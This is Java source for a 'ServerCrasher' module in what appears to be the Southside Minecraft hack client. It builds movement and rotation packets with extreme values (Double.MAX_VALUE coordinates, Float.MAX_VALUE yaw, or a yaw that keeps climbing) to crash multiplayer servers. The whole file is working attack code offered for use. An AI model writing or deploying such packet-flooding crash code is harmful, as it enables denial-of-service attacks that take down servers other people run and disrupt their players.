package dev.southside.module.impl.misc;

import cc.polyfrost.oneconfig.config.options.impl.Dropdown;
import cc.polyfrost.oneconfig.config.options.impl.Slider;
import dev.southside.Southside;
import dev.southside.event.Stage;
import dev.southside.event.events.MotionEvent;
import dev.southside.module.Category;
import dev.southside.module.Module;
import dev.southside.orbit.EventHandler;
import dev.southside.utils.misc.ClientUtils;
import net.minecraft.class_243;
import net.minecraft.class_2828.class_2829;
import net.minecraft.class_2828.class_2831;

public class ServerCrasher extends Module {
   public Dropdown mode = new Dropdown("Mode", "HighYaw", "HighYaw", "FarPosition", "InfYaw");
   public Slider incment = new Slider("Yaw Increment", 1000, 100, 1000000, 100);
   float yaw = 0.0F;

   public ServerCrasher() {
      super(Category.Misc, "ServerCrasher", "Crashes the server");
   }

   @EventHandler
   public void onMotion(MotionEvent event) {
      if (event.getState() == Stage.PRE && this.mode.isMode("HighYaw")) {
         this.yaw = this.yaw + this.incment.getValue().floatValue();
         event.setYaw(this.yaw);
         event.setModified(true);
      }
   }

   @Override
   public void onEnable() {
      if (!ClientUtils.nullCheck()) {
         this.yaw = mc.field_1724.method_36454();
         if (this.mode.isMode("FarPosition")) {
            class_243 pos1 = new class_243(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
            mc.field_1724
               .field_3944
               .method_52787(new class_2829(pos1.field_1352, pos1.field_1351, pos1.field_1350, mc.field_1724.method_24828(), mc.field_1724.field_5976));
         }

         if (this.mode.isMode("InfYaw")) {
            mc.field_1724
               .field_3944
               .method_52787(new class_2831(Float.MAX_VALUE, mc.field_1724.method_36455(), mc.field_1724.method_24828(), mc.field_1724.field_5976));
         }

         if (!this.mode.isMode("HighYaw")) {
            Southside.get().getModuleManager().get(ServerCrasher.class).setEnable(false);
         }
      }
   }
}
